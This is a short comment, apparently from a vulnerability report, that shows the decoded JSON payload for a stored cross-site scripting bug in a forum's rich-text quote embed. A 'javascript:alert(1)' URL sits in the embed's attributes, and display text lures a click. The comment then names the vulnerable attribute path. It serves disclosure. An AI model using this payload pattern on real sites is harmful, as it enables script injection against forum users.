Meant to mention, the payload before it is encoded looks like this:
```
[
    {
        "insert": {
            "embed-external": {
                "data": {
                    "url": "",
                    "type": "quote",
                    "name": null,
                    "body": null,
                    "photoUrl": null,
                    "height": null,
                    "width": null,
                    "attributes": {
                        "commentID": 2,
                        "bodyRaw": "this is an xss test, click the date time for this embed!",
                        "dateInserted": "2019-03-17T05:49:04+00:00",
                        "dateUpdated": null,
                        "insertUser": {
                            "userID": 6,
                            "name": "Click the date -->",
                            "photoUrl": "https:\/\/images.v-cdn.net\/stubcontent\/avatar_03.png",
                            "dateLastActive": "2019-03-17T05:49:03+00:00"
                        },
                        "url": "javascript:alert(1)",
                        "format": "Markdown"
                    }
                },
                "loaderData": {
                    "type": "link",
                    "link": ""
                }
            }
        }
    },
    {
        "insert": "\n"
    }
]
```
So the vulnerable attribute of the embed is `insert > embed-external > data > attributes > url`
